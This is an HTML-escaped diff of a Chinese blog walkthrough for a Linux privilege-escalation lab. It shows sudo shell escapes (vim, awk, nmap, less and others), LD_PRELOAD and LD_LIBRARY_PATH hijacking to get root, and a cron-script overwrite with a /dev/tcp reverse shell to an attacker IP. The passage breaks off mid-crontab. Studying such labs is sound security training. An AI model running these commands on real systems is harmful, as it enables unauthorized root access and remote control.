+&lt;p&gt;​&lt;img src=&#34;assets/image-20221216113001-bg68utu.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;运行 &lt;strong&gt;sudo /usr/bin/nano&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;输入 &lt;strong&gt;Ctrl + R&lt;/strong&gt; 然后 &lt;strong&gt;Ctrl + X&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;输入 &lt;strong&gt;reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;vim&#34;&gt;vim&lt;/h3&gt;
+&lt;p&gt;vim要简单一点&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo vim -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:!/bin/sh&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;  myvpn.ovpn  tools
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;man&#34;&gt;man&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo man man
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入 sudo man man后输入! /bin/sh&lt;/p&gt;
+&lt;h3 id=&#34;awk&#34;&gt;AWK&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;less&#34;&gt;less&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo less /etc/profile
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ftp&#34;&gt;FTP&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; !/bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# sudo ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; !/bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;nmap&#34;&gt;nmap&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo nmap --interactive
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap V. 5.00 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; http://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; help
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap&amp;gt; ! sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;more&#34;&gt;more&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sudo more /etc/profile
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;`id -u`&amp;#34;&lt;/span&gt; -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export PATH
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$PS1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$BASH&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# The file bash.bashrc already sets the default PS1.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# PS1=&amp;#39;\h:\w\$ &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -f /etc/bash.bashrc &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      . /etc/bash.bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;`id -u`&amp;#34;&lt;/span&gt; -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      PS1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;# &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      PS1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$ &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;!/bin/sh   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x5-sudo&#34;&gt;0x5 sudo&lt;/h1&gt;
+&lt;p&gt;Sudo 可以配置为从用户环境中继承某些环境变量。&lt;/p&gt;
+&lt;p&gt;检查继承了哪些环境变量（查找 env_keep 选项）：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;sudo -l&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;LD_PRELOAD 和 LD_LIBRARY_PATH 都是从用户环境继承而来的。 LD_PRELOAD 在程序运行时先加载一个共享对象。LD_LIBRARY_PATH 提供首先搜索共享库的目录列表。&lt;/p&gt;
+&lt;p&gt;使用位于/home/user/tools/sudo/preload.c 的代码创建共享对象：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;运行允许通过 sudo 运行的程序之一（在运行&lt;strong&gt;sudo -l&lt;/strong&gt;时列出），同时将 LD_PRELOAD 环境变量设置为新共享对象的完整路径：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;sudo LD_PRELOAD=/tmp/preload.so program-name-here&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;应该产生一个root shell。在继续之前退出 shell。&lt;/p&gt;
+&lt;p&gt;对 apache2 程序文件运行 ldd 以查看该程序使用了哪些共享库：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;ldd /usr/sbin/apache2&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;使用位于 /home/user/tools/sudo/library_path.c 的代码创建一个与列出的库 (libcrypt.so.1) 同名的共享对象：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;使用 sudo 运行 apache2，同时将 LD_LIBRARY_PATH 环境变量设置为 /tmp（我们输出已编译的共享对象）：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;sudo LD_LIBRARY_PATH=/tmp apache2&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;应该产生一个root shell。退出shell。尝试将 /tmp/libcrypt .so.1 重命名为 apache2 使用的另一个库的名称，然后再次使用 sudo 重新运行 apache2。&lt;/p&gt;
+&lt;p&gt;​&lt;img src=&#34;https://s2.loli.net/2022/12/17/3ikUorsZvbKa2ty.png&#34; alt=&#34;&#34;&gt;​&lt;/p&gt;
+&lt;p&gt;首先我们sudo -l 查看&lt;/p&gt;
+&lt;p&gt;在进入以下阶段是时候我参考了这两篇文章：&lt;a href=&#34;https://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/&#34;&gt;LD_PRELOAD教程&lt;/a&gt;，&lt;a href=&#34;https://rafalcislak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/&#34;&gt;LD_PRELOAD2教程&lt;/a&gt;，我们继续开始&lt;/p&gt;
+&lt;p&gt;​&lt;img src=&#34;assets/image-20221216120856-nkkxavn.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们来解释一下这个过程，首先setresuid()设置调用进程的真实用户ID、有效用户ID和保存的set-user-ID，这些设置为0，属于ROOT用户ID，在 Preload.so中首先加载，因为它是用 LD_PRELOAD设置的&lt;br&gt;
+iftop已经设置了sudo权限，因此我们得到了一个 rootshell。&lt;/p&gt;
+&lt;p&gt;接下里我们使用LD_LIBRARY_PATH&lt;/p&gt;
+&lt;p&gt;​&lt;img src=&#34;https://s2.loli.net/2022/12/17/Uu86syWcYdxHrke.png&#34; alt=&#34;&#34;&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ ldd /usr/sbin/apache2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        linux-vdso.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007fff60bff000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libpcre.so.3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/x86_64-linux-gnu/libpcre.so.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea85e2000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libaprutil-1.so.0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /usr/lib/libaprutil-1.so.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea83be000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libapr-1.so.0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /usr/lib/libapr-1.so.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea8184000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libpthread.so.0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/libpthread.so.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea7f68000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libc.so.6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/libc.so.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea7bfc000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libuuid.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/libuuid.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea79f7000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        librt.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/librt.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea77ef000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libcrypt.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/libcrypt.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea75b8000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libdl.so.2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /lib/libdl.so.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea73b3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        libexpat.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /usr/lib/libexpat.so.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea718b000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        /lib64/ld-linux-x86-64.so.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00007f9ea8a9f000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ sudo LD_LIBRARY_PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp apache2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2: /tmp/libcrypt.so.1: no version information available &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;required by /usr/lib/libaprutil-1.so.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:/home/user# 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:/home/user# 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:/home/user# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在让我们尝试重命名&lt;code&gt;/tmp/libcrypt.so.1&lt;/code&gt;​为&lt;code&gt;/tmp/libpcre.so.3&lt;/code&gt;​used by apache2 并再次使用 sudo 重新运行 apache2 并让我们看看是否为我们提供了 root shell。&lt;/p&gt;
+&lt;p&gt;​&lt;img src=&#34;https://s2.loli.net/2022/12/17/nl3Rkf9OpQ5mI1w.png&#34; alt=&#34;&#34;&gt;​&lt;/p&gt;
+&lt;h1 id=&#34;0x6-cron-job&#34;&gt;0x6 Cron job&lt;/h1&gt;
+&lt;p&gt;Cron 作业是用户可以安排在特定时间或间隔运行的程序或脚本。Cron 表文件 (crontabs) 存储 cron 作业的配置。 系统范围的 crontab 位于 /etc/crontab。&lt;/p&gt;
+&lt;p&gt;查看系统范围的crontab的内容：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;cat /etc/crontab&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;每分钟应该有两个计划运行的 cron 作业。一个运行 overwrite.sh，另一个运行 /usr/local/bin/compress.sh。&lt;/p&gt;
+&lt;p&gt;找到 overwrite.sh 文件的完整路径：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;locate overwrite.sh&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;请注意，该文件是全局可写的：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;ls -l /usr/local/bin/overwrite.sh&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;将IP 地址更改为您的 Kali 盒子的 IP 地址后，将overwrite.sh 文件的内容替换为 以下内容。&lt;/p&gt;
+&lt;p&gt;#!/bin/bash&lt;br&gt;
+bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/4444 0&amp;gt;&amp;amp;1&lt;/p&gt;
+&lt;p&gt;在端口 4444 上的 Kali 机器上设置一个 netcat 监听器并等待 cron 作业运行（不应超过一分钟）。根 shell 应该连接回您的 netcat 侦听器。如果它不重新检查文件的权限，是否缺少任何内容？&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;nc -nvlp 4444&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ser@debian:~$ cat /etc/crontab 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# /etc/crontab: system-wide crontab&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# command to install the new version when you edit this file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# and files in /etc/cron.d. These files also have username fields,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# that none of the other crontabs do.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SHELL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# m h dom mon dow user  command&lt;/span&gt;
